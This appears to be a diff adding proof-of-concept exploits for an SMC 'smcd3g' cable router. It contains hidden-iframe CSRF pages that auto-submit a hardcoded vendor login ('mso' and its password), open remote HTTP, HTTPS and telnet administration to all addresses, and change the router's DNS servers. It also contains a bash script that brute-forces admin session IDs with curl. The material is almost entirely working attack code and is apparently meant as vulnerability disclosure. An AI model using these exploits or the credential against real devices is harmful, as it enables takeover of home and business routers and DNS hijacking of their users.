@@ -1,0 +1,100 @@
+Cross-site request-forgery:
+
+## smcd3g-csrf-poc.htm
+ 
+<html>
+<body>
+<iframe src="./smcd3g-csrf-poc-1.htm" width="1" height="1">
+</iframe>
+<iframe src="./smcd3g-csrf-poc-2.htm" width="1" height="1">
+</iframe>
+<iframe src="./smcd3g-csrf-poc-3.htm" width="1" height="1">
+</iframe> </body> </html>
+ 
+## smcd3g-csrf-poc-1.htm
+ 
+<html>
+<body>
+<form action="http://10.1.10.1/goform/login" method="post"
+    name="tF">
+<input type="hidden" name="user" value="mso" />
+<input type="hidden" name="pws" value="D0nt4g3tme" />
+</form> <script> document.tF.submit(); </script> </body>
+</html>
+ 
+## smcd3g-csrf-poc-2.htm
+ 
+<html>
+<body>
+<form action="http://10.1.10.1/goform/RemoteRange"
+name="RMangement" method="post"> <input type="hidden"
+value="feat-admin-remote" name="file"> <input type="hidden"
+value="admin/" name="dir"> <input type="hidden"
+name="RemoteRange" value="0" /> <input type="hidden"
+name="rm_access" value="on" /> <input type="hidden"
+name="Remote0" value="0.0.0.0,0.0.0.0,1" /> <input
+type="hidden" name="http_port" value="8080" /> <input
+type="hidden" name="http_enable" value="on" /> <input
+type="hidden" name="http_flag" value="1" /> <input
+type="hidden" name="msoremote_enableCheck" value="on" />
+<input type="hidden" name="mso_remote_enable" value="1" />
+<input type="hidden" name="remote_enable" value="0" />
+<input type="hidden" name="https_enable" value="on" />
+<input type="hidden" name="https_port" value="8181" />
+<input type="hidden" name="https_flag" value="1" /> <input
+type="hidden" name="telnet_enable" value="on" /> <input
+type="hidden" name="telnet_port" value="2323" /> <input
+type="hidden" name="telnet_flag" value="1" /> <input
+type="hidden" name="Remote1=" value="" /> </form> </body>
+</html> <script>
+setTimeout("document.RMangement.submit()",4000);
+</script>
+</body>
+</html>
+ 
+## smcd3g-csrf-poc-3.htm
+ 
+<html>
+<body>
+<form name="WanIPform"
+action="http://10.1.10.1/goform/Basic" method="post"> <input
+type="hidden" value="feat-wan-ip" name="file"> <input
+type="hidden" value="admin/" name="dir"> <input
+type="hidden" value="Fixed" name="DNSAssign"> <input
+type="hidden" value="0" name="dhcpc_release"> <input
+type="hidden" value="0" name="dhcpc_renew"> <input
+type="hidden" value="" name="domain_name"> <input
+type="hidden" value="" name="WDn"> <input type="hidden"
+name="SysName" value="" /> <input type="hidden"
+name="manual_dns_enable" value="on" /> <input type="hidden"
+name="DAddr" value="4.2.2.1" /> <input type="hidden"
+name="DAddr0" value="4" /> <input type="hidden"
+name="DAddr1" value="2" /> <input type="hidden"
+name="DAddr2" value="2" /> <input type="hidden"
+name="DAddr3" value="1" /> <input type="hidden"
+name="PDAddr" value="4.2.2.2" /> <input type="hidden"
+name="PDAddr0" value="4" /> <input type="hidden"
+name="PDAddr1" value="2" /> <input type="hidden"
+name="PDAddr2" value="2" /> <input type="hidden"
+name="PDAddr3" value="2" /> </form> <script>
+setTimeout("document.WanIPform.submit()",5000);
+</script>
+</body>
+</html>
+
+
+Security-bypass:
+
+## smcd3g-session-poc.sh
+ 
+#!/bin/bash
+start=1267604160
+end=1267605960
+for (( i=$start; i<=$end; i++)) do if [ `curl -sb userid=$i
+http://10.1.10.1/admin/index.asp | grep -c login.asp` -lt
+"1" ] then echo "Session ID Found:  $i"
+fi
+if [ $(($i % 100)) -eq "0" ]
+then echo "Currently at $i"
+fi
+done
